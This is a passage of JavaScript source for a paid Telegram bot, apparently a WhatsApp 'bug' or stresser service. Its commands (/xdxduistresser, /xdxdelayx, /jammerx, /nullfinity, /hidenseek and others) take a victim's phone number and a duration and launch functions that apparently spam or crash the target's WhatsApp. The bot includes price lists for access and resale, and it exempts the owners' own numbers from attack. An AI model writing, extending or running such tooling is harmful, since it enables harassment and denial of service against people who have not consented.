    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
      await XiosInviOld(durationHours, formattedNumber, userNumber, chatId, botInstance)
  } catch (error) {
    console.error(`Error in /iosvisible for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /iosvisible: ${error.message}`);
  }
});

botInstance.onText(/\/xdxduistresser(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /${match[1]} raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /${match[1]} input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /${match[1]}: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /${match[1]}: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /${match[1]}: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /${match[1]}: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /${match[1]}: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /${match[1]}: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.\nExample: /fcspambeta +919876543210 2 or /uistresser +919876543210 2`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      xeonSpamDroidInitiator(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /${match[1]} for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /${match[1]}: ${error.message}`);
  }
});

botInstance.onText(/\/xdxdelayx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /${match[1]} raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /${match[1]} input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /${match[1]}: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delayx +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /${match[1]}: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delayx +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /${match[1]}: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).\nExample: /delayx +919876543210 2');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /${match[1]}: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).\nExample: /delayx +919876543210 2');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /${match[1]}: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /${match[1]}: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.\nExample: /delayx +919876543210 2`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await delayxInitiator(durationHours, formattedNumber, userNumber, chatId, botInstance)
  } catch (error) {
    console.error(`Error in /${match[1]} for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /${match[1]}: ${error.message}`);
  }
});

botInstance.onText(/\/xdxddelayperma(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /${match[1]} raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /${match[1]} input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /${match[1]}: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /delayperma +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /${match[1]}: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /delayperma +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /${match[1]}: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).\nExample: /delayperma +919876543210 2');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /${match[1]}: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).\nExample: /delayperma +919876543210 2');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /${match[1]}: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /${match[1]}: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.\nExample: /delayperma +919876543210 2`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });
    
    await Promise.all([
      delaypermaInitiator(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);

  } catch (error) {
    console.error(`Error in /${match[1]} for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /${match[1]}: ${error.message}`);
  }
});

botInstance.onText(/\/jammerx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /${match[1]} raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /${match[1]} input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /${match[1]}: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /jammerx +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /${match[1]}: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /jammerx +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /${match[1]}: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).\nExample: /jammerx +919876543210 2');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /${match[1]}: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).\nExample: /jammerx +919876543210 2');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /${match[1]}: numberTarget = "${numberTarget}", duration = ${durationHours} hours`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /${match[1]}: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.\nExample: /jammerx +919876543210 2`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bug...
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

    // Run both XeonDelay1 and XeonDelay2 concurrently
    await Promise.all([
      jammerxInitiator(durationHours, formattedNumber, userNumber, chatId, botInstance)
    ]);
  } catch (error) {
    console.error(`Error in /${match[1]} for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /${match[1]}: ${error.message}`);
  }
});

botInstance.onText(/\/xtes(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xjammer raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /xjammer input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xjammer: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xjammer +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xjammer: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xjammer: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xjammer: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xjammer: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  if (numberTarget.includes('@g.us')) {
    return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent messages...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });
for (let i = 0; i <10; i++) {
    await forcer(formattedNumber, userNumber, chatId, botInstance);
    }
  } catch (error) {
    console.error(`Error in /xjammer for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xjammer: ${error.message}`);
  }
});

// Register the /delayking command
/*botInstance.onText(/\/delayking(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /delayking raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /delayking input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /delayking: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /delayking +919876543210');
  }

  const rawTarget = match[1].trim();
  console.log(`[DEBUG] /delayking: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /delayking: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /delayking: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /delayking: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  if (numberTarget.includes('@g.us')) {
    return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent messages...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await sendMessagesForDuration(1, formattedNumber, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /delayking for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /delayking: ${error.message}`);
  }
});

// Register the /xios command
botInstance.onText(/\/xios(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xios raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /xios input: match[1] = "${match[1]}"`);

  if (!match[1] || match[1].trim() === '') {
    console.log(`[DEBUG] /xios: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /xios +919876543210');
  }

  const rawTarget = match[1].trim();
  console.log(`[DEBUG] /xios: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /xios: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /xios: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /xios: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104403'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  if (numberTarget.includes('@g.us')) {
    return userBot.sendMessage(chatId, '❌ Group chats are not supported.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent messages...
│ Target: ${numberTarget}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    await runXiosLoop(formattedNumber, userNumber, chatId, botInstance);
  } catch (error) {
    console.error(`Error in /xios for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xios: ${error.message}`);
  }
});*/

botInstance.onText(/\/nullfinity(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /nullfinity raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /nullfinity input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /nullfinity: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number.\nExample: /nullfinity +919876543210');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /nullfinity: rawTarget = "${rawTarget}"`);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /nullfinity: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
  console.log(`[DEBUG] /nullfinity: numberTarget = "${numberTarget}"`);

  if (numberTarget.length < 8 || numberTarget.length > 15) {
    console.log(`[DEBUG] /nullfinity: Invalid number length for "${numberTarget}" (length: ${numberTarget.length})`);
    return userBot.sendMessage(chatId, `❌ Invalid target number length (${numberTarget.length} digits). Must be 8-15 digits.`);
  }

  if (numberTarget === userNumber) {
    return userBot.sendMessage(chatId, '❌ Cannot target your own number.');
  }

  const blockedNumbers = ['916909137213', '919366316018', '919402104401'];
  if (blockedNumbers.includes(numberTarget)) {
    return userBot.sendMessage(chatId, '❌ Cannot target owner number.');
  }

  const formattedNumber = `${numberTarget}@s.whatsapp.net`;

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ Sent bvg to 👇🏻
│➻ Target: ${numberTarget}
│➻ From: ${userNumber}
└────────────────────────┘`,
parse_mode: 'HTML'
    });
        for (let i = 0; i < 1; i++) {
          await xeonNullfinity(formattedNumber, userNumber, chatId, botInstance, true);
          await sleep(1000);
        }
  } catch (error) {
    console.error(`Error in /nullfinity for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /nullfinity: ${error.message}`);
  }
});

botInstance.onText(/\/hidenseek(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /hidenseek raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
const isVip = await checkVipMembership(senderId, userBot);
if (!db.premiumUsers.includes(senderId) && !CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId) && !isVip) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 15$
✅ Resell permanent: 35$
✅ Script No Enc 100%: 100$`);
}

  console.log(`[DEBUG] /hidenseek input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /hidenseek: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a target number and duration.\nExample: /hidenseek +919876543210 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /hidenseek: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a target number and duration in hours.\nExample: /hidenseek +919876543210 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!isValidPhoneNumber(rawTarget)) {
    console.log(`[DEBUG] /hidenseek: Invalid phone number format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid target number. Use international format (e.g., +919876543210).');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /hidenseek: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  const numberTarget = rawTarget.replace(/[^0-9+]/g, '').replace(/^\+/, '');
